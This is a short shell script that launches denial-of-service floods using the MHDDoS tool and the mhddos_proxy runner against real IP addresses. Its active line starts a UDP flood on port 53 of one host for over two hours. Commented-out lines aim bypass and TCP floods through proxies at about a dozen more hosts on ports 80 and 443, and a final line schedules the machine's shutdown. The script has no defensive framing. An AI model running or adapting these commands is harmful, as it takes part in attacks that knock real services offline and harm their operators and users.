#!/bin/sh
#rm /home/ubuntu/mhddos/files/proxies/socks5.txt;
#python3 /home/ubuntu/mhddos/start.py bypass 176.67.241.93:443 5 1000 socks5.txt 100000 3600 &

python3 /home/ubuntu/mhddos_proxy/MHDDoS/start.py udp 92.53.97.198:53 2000 8200 &

#cd /home/ubuntu/mhddos_proxy
#python3 /home/ubuntu/mhddos_proxy/runner.py tcp://193.187.96.13:443 tcp://95.131.30.226:443 tcp://91.208.42.10:443 tcp://82.142.162.147:443 tcp://79.143.30.47:443 tcp://84.201.150.151:443 tcp://178.154.220.43:443 tcp://195.24.68.19:443 tcp://5.181.252.248:443 tcp://77.222.61.241:443 -p 300 --proxy-timeout 4 &
#python3 /home/ubuntu/mhddos_proxy/runner.py tcp://80.249.129.244:443 tcp://80.249.129.244:80 -t 1000 -p 300 --rpc 50 --http-methods TCP FLOOD &
sudo shutdown -P +120 &
